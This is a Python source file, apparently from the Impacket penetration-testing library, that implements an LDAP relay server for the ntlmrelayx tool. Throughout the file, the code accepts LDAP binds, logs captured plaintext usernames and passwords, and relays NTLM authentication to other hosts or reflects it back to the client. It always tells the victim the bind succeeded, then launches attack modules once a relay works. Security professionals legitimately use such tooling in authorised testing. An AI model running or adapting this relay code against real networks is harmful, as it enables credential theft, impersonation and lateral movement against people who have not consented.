# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   LDAP Relay Server
#
#   This is the LDAP server which relays the connections
#   to other protocols
#
# Authors:
#   Alberto Solino (@agsolino)
#
from __future__ import division
from __future__ import print_function
from threading import Thread
import socket
import logging
import traceback

import struct
import socket
import logging
from threading import Thread
from impacket.ldap import ldapasn1
from pyasn1.codec.ber import decoder, encoder
from pyasn1.type import univ
from impacket import ntlm
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech, SPNEGO_NegTokenResp
from impacket.nt_errors import STATUS_SUCCESS, STATUS_MORE_PROCESSING_REQUIRED
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor

class LDAPRelayServer(Thread):
    def __init__(self,config):
        Thread.__init__(self)
        self.daemon = True
        self.server = 0
        #Config object
        self.config = config
        #Current target IP
        self.target = None
        #Targets handler
        self.targetprocessor = self.config.target
        #Username we auth as gets stored here later
        self.authUser = None
        self.proxyTranslator = None
        self.challenges = {}

        # Change address_family to IPv6 if this is configured
        if self.config.ipv6:
            self.address_family = socket.AF_INET6
        else:
            self.address_family = socket.AF_INET

        if self.config.listeningPort:
            self.ldapport = self.config.listeningPort
        else:
            self.ldapport = 389

    def run(self):
        logging.info("Setting up LDAP Server on port %s" % self.ldapport)
        self.sock = socket.socket(self.address_family, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.config.interfaceIp, self.ldapport))
        self.sock.listen(1)

        while True:
            conn, addr = self.sock.accept()
            logging.info('LDAP connection from %s' % str(addr))
            handler = LDAPHandler(conn, addr, self)
            handler.start()

class LDAPHandler(Thread):
    def __init__(self, conn, addr, server):
        Thread.__init__(self)
        self.daemon = True
        self.conn = conn
        self.addr = addr
        self.server = server
        self.client = None
        self.challengeMessage = None

    def run(self):
        connection_active = True
        while connection_active:
            try:
                data = self.conn.recv(1024)
                if not data:
                    break

                while len(data) > 0:
                    decoded_message, data = decoder.decode(data, asn1Spec=ldapasn1.LDAPMessage())

                    if decoded_message['protocolOp'].getName() == 'bindRequest':
                        self.handle_bind_request(decoded_message)
                    elif decoded_message['protocolOp'].getName() == 'searchRequest':
                        self.handle_search_request(decoded_message)
                    elif decoded_message['protocolOp'].getName() == 'unbindRequest':
                        logging.info("LDAP: Unbind request received, closing connection.")
                        connection_active = False
                        break
                    else:
                        logging.warning("LDAP server only supports BIND, SEARCH and UNBIND requests, received %s" % decoded_message['protocolOp'].getName())

            except Exception:
                logging.error("Exception in LDAPHandler.run:")
                logging.error(traceback.format_exc())
                break
        self.conn.close()

    def handle_search_request(self, ldap_message):
        search_request = ldap_message['protocolOp']['searchRequest']
        # We need to craft a searchResEntry and a searchResDone message to the client
        # This is a fake search entry, but it should be enough to make the client happy
        search_res_entry = ldapasn1.SearchResultEntry()
        search_res_entry['objectName'] = ''
        
        attributes = ldapasn1.PartialAttributeList()
        for requested_attribute in search_request['attributes']:
            pa = ldapasn1.PartialAttribute()
            pa['type'] = requested_attribute
            vals = univ.SetOf()
            if str(requested_attribute) == 'defaultNamingContext':
                vals.append(ldapasn1.AttributeValue('DC=impacket,DC=local'))
            pa['vals'] = vals
            attributes.append(pa)
        search_res_entry['attributes'] = attributes
        
        response_ldap_message_entry = ldapasn1.LDAPMessage()
        response_ldap_message_entry['messageID'] = ldap_message['messageID']
        response_ldap_message_entry['protocolOp']['searchResEntry'] = search_res_entry
        self.conn.sendall(encoder.encode(response_ldap_message_entry))

        search_res_done = ldapasn1.SearchResultDone()
        search_res_done['resultCode'] = ldapasn1.ResultCode('success')
        search_res_done['matchedDN'] = ''
        search_res_done['diagnosticMessage'] = ''

        response_ldap_message_done = ldapasn1.LDAPMessage()
        response_ldap_message_done['messageID'] = ldap_message['messageID']
        response_ldap_message_done['protocolOp']['searchResDone'] = search_res_done

        self.conn.sendall(encoder.encode(response_ldap_message_done))

    def handle_bind_request(self, ldap_message):
        bind_request = ldap_message['protocolOp']['bindRequest']
        logging.debug("LDAP: Full bind request: %s" % bind_request)
        auth_choice = bind_request['authentication']
        
        logging.debug("LDAP: Received bind request with auth choice: %s" % auth_choice.getName())

        if auth_choice.getName() == 'sasl':
            sasl_credentials = auth_choice['sasl']
            mechanism = sasl_credentials['mechanism']
            
            if 'GSS-SPNEGO' in str(mechanism):
                self.handle_spnego_bind(ldap_message, sasl_credentials)
            else:
                logging.error("Unsupported SASL mechanism: %s" % mechanism)
        elif auth_choice.getName() == 'simple':
            username = bind_request['name'].asOctets().decode('utf-8')
            password = auth_choice['simple'].asOctets().decode('utf-8')
            self.handle_simple_bind(ldap_message, username, password)
        elif auth_choice.getName() == 'sicilyNegotiate' or auth_choice.getName() == 'sicilyResponse':
            self.handle_sicily_bind(ldap_message, auth_choice)
        else:
            logging.error("Unsupported authentication choice: %s" % auth_choice.getName())

    def handle_simple_bind(self, ldap_message, username, password):
        logging.debug("LDAP: Simple bind request received for user: %r" % username)
        logging.debug("LDAP: Password: %r" % password)
        if not username:
            logging.warning("LDAP: Anonymous bind requests cannot be relayed (or username was not parsed correctly).")
            # Send a bind response indicating success
            bind_response = ldapasn1.BindResponse()
            bind_response['resultCode'] = ldapasn1.ResultCode('invalidCredentials')
            bind_response['matchedDN'] = ''
            bind_response['diagnosticMessage'] = ''

            response_ldap_message = ldapasn1.LDAPMessage()
            response_ldap_message['messageID'] = ldap_message['messageID']
            response_ldap_message['protocolOp']['bindResponse'] = bind_response

            self.conn.sendall(encoder.encode(response_ldap_message))
            return
            
        if self.server.config.mode.upper() == 'REFLECTION':
            self.server.targetprocessor = TargetsProcessor(singleTarget='LDAP://%s:%d' % (self.addr[0], self.ldapport))

        self.server.target = self.server.targetprocessor.getTarget()
        if self.server.target is None:
            if self.server.config.keepRelaying:
                self.server.config.target.reloadTargets(full_reload=True)
                self.target = self.server.config.target.getTarget()
            else:
                logging.info('LDAP: No more targets left!')
                return

        logging.info("LDAP: Relaying credentials for %s to %s://%s" % (username, self.server.target.scheme, self.server.target.netloc))

        try:
            self.client = self.server.config.protocolClients[self.server.target.scheme.upper()](self.server.config, self.server.target)
            if not self.client.initConnection():
                raise Exception("Could not initialize connection")
        except Exception as e:
            logging.error("LDAP: Connection against target %s://%s FAILED: %s" % (self.server.target.scheme, self.server.target.netloc, str(e)))
            self.server.targetprocessor.registerTarget(self.server.target, False, username)
            return

        clientResponse, error_code = self.client.login(username, password)

        if error_code == STATUS_SUCCESS:
            logging.info("LDAP: Authentication successful!")
            self.server.targetprocessor.registerTarget(self.server.target, True, username)
            if self.server.target.scheme.upper() in self.server.config.attacks:
                clientThread = self.server.config.attacks[self.server.target.scheme.upper()](self.server.config, self.client.session, username)
                clientThread.start()
        else:
            logging.error("LDAP: Authentication failed!")
            self.server.targetprocessor.registerTarget(self.server.target, False, username)

        bind_response = ldapasn1.BindResponse()
        bind_response['resultCode'] = ldapasn1.ResultCode('success')
        bind_response['matchedDN'] = ''
        bind_response['diagnosticMessage'] = ''
        
        response_ldap_message = ldapasn1.LDAPMessage()
        response_ldap_message['messageID'] = ldap_message['messageID']
        response_ldap_message['protocolOp']['bindResponse'] = bind_response
        
        self.conn.sendall(encoder.encode(response_ldap_message))

    def handle_sicily_bind(self, ldap_message, auth_choice):
        token = auth_choice.getComponent().asOctets()
        logging.debug("LDAP: Received Sicily NTLM token: %r" % token)
        from impacket.structure import hexdump
        logging.debug("LDAP: Sicily NTLM token hexdump:")
        if logging.getLogger().level == logging.DEBUG:
            hexdump(token)

        if not token.startswith(b'NTLMSSP\x00'):
            logging.error("Unknown NTLM message type")
            return

        message_type = struct.unpack('<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
        logging.debug("LDAP: NTLM message type: %d" % message_type)

        if message_type == 0x01:  # NTLMSSP_NEGOTIATE
            self.handle_negotiate(ldap_message, token, auth_type='sicily')
        elif message_type == 0x03:  # NTLMSSP_AUTH
            self.handle_auth(ldap_message, token)
        else:
            logging.error("Unknown NTLM message type: %d" % message_type)

    def handle_spnego_bind(self, ldap_message, sasl_credentials):
        token = sasl_credentials['credentials']
        logging.debug("LDAP: Received SPNEGO NTLM token: %r" % token)
        
        if len(token) > 0:
            try:
                neg_token_init = decoder.decode(token.asOctets(), asn1Spec=SPNEGO_NegTokenInit())[0]
                mech_token = neg_token_init['mechToken'].asOctets()
            except:
                # It's probably a NTLMSSP AUTH packet
                mech_token = token.asOctets()

            logging.debug("LDAP: Extracted mech_token: %r" % mech_token)
            
            # Search for the NTLMSSP header
            ntlm_header = b'NTLMSSP\x00'
            ntlm_start = mech_token.find(ntlm_header)
            if ntlm_start == -1:
                logging.error("Unknown NTLM message type")
                return
            
            mech_token = mech_token[ntlm_start:]
            from impacket.structure import hexdump
            logging.debug("LDAP: NTLM message from mech_token hexdump:\n%s" % hexdump(mech_token))

            if not mech_token.startswith(b'NTLMSSP\x00'):
                logging.error("Unknown NTLM message type")
                return

            message_type = struct.unpack('<L', mech_token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
            logging.debug("LDAP: NTLM message type: %d" % message_type)
            
            if message_type == 0x01: # NTLMSSP_NEGOTIATE
                self.handle_negotiate(ldap_message, mech_token, auth_type='spnego')
            elif message_type == 0x03: # NTLMSSP_AUTH
                self.handle_auth(ldap_message, mech_token)
            else:
                logging.error("Unknown NTLM message type: %d" % message_type)

    def handle_negotiate(self, ldap_message, negotiate_message_data, auth_type='spnego'):
        if self.server.config.mode.upper() == 'REFLECTION':
            self.server.targetprocessor = TargetsProcessor(singleTarget='LDAP://%s:%d' % (self.addr[0], self.ldapport))

        self.server.target = self.server.targetprocessor.getTarget()
        if self.server.target is None:
            logging.info('LDAP: No more targets left!')
            return

        logging.info("LDAP: Relaying credentials to %s://%s" % (self.server.target.scheme, self.server.target.netloc))

        try:
            self.client = self.server.config.protocolClients[self.server.target.scheme.upper()](self.server.config, self.server.target)
            if not self.client.initConnection():
                raise Exception("Could not initialize connection")
        except Exception as e:
            logging.error("LDAP: Connection against target %s://%s FAILED: %s" % (self.server.target.scheme, self.server.target.netloc, str(e)))
            self.server.targetprocessor.registerTarget(self.server.target, False, self.server.authUser)
            return

        self.challengeMessage = self.client.sendNegotiate(negotiate_message_data)
        self.server.challenges[self.addr[0]] = self.challengeMessage

        bind_response = ldapasn1.BindResponse()
        bind_response['diagnosticMessage'] = ''

        if auth_type == 'spnego':
            bind_response['resultCode'] = ldapasn1.ResultCode('saslBindInProgress')
            bind_response['matchedDN'] = ''

            resp_token = SPNEGO_NegTokenResp()
            resp_token['negState'] = b'\x01'  # accept-incomplete
            resp_token['supportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
            resp_token['responseToken'] = self.challengeMessage.getData()

            bind_response['serverSaslCreds'] = resp_token.getData()
        
        elif auth_type == 'sicily':
            bind_response['resultCode'] = ldapasn1.ResultCode('saslBindInProgress')
            bind_response['matchedDN'] = self.challengeMessage.getData()

        response_ldap_message = ldapasn1.LDAPMessage()
        response_ldap_message['messageID'] = ldap_message['messageID']
        response_ldap_message['protocolOp']['bindResponse'] = bind_response

        self.conn.sendall(encoder.encode(response_ldap_message))

    def handle_auth(self, ldap_message, auth_message_data):
        if self.challengeMessage is None:
            if self.addr[0] in self.server.challenges:
                self.challengeMessage = self.server.challenges.pop(self.addr[0])
            else:
                logging.error("No challenge message found for %s" % self.addr[0])
                return
        
        from impacket.structure import hexdump
        logging.debug("LDAP: auth_message_data hexdump:\n%s" % hexdump(auth_message_data))
        
        authenticate_message = ntlm.NTLMAuthChallengeResponse()
        authenticate_message.fromString(auth_message_data)
        logging.debug("LDAP: NTLM AUTH FIELDS: domain_name: %r, user_name: %r, ntlm response length: %d" % (
            authenticate_message['domain_name'],
            authenticate_message['user_name'],
            len(authenticate_message['ntlm'])
        ))
        self.server.authUser = authenticate_message.getUserString()
        logging.debug("LDAP: Authenticated user string: %r" % self.server.authUser)

        clientResponse, error_code = self.client.sendAuth(auth_message_data, self.challengeMessage['challenge'])

        if error_code == STATUS_SUCCESS:
            logging.info("LDAP: Authentication successful!")
            self.server.targetprocessor.registerTarget(self.server.target, True, self.server.authUser)
            if self.server.target.scheme.upper() in self.server.config.attacks:
                clientThread = self.server.config.attacks[self.server.target.scheme.upper()](self.server.config, self.client.session, self.server.authUser)
                clientThread.start()
        else:
            logging.error("LDAP: Authentication failed!")
            self.server.targetprocessor.registerTarget(self.server.target, False, self.server.authUser)

        bind_response = ldapasn1.BindResponse()
        bind_response['resultCode'] = ldapasn1.ResultCode('success')
        bind_response['matchedDN'] = ''
        bind_response['diagnosticMessage'] = ''
        
        response_ldap_message = ldapasn1.LDAPMessage()
        response_ldap_message['messageID'] = ldap_message['messageID']
        response_ldap_message['protocolOp']['bindResponse'] = bind_response
        
        self.conn.sendall(encoder.encode(response_ldap_message))


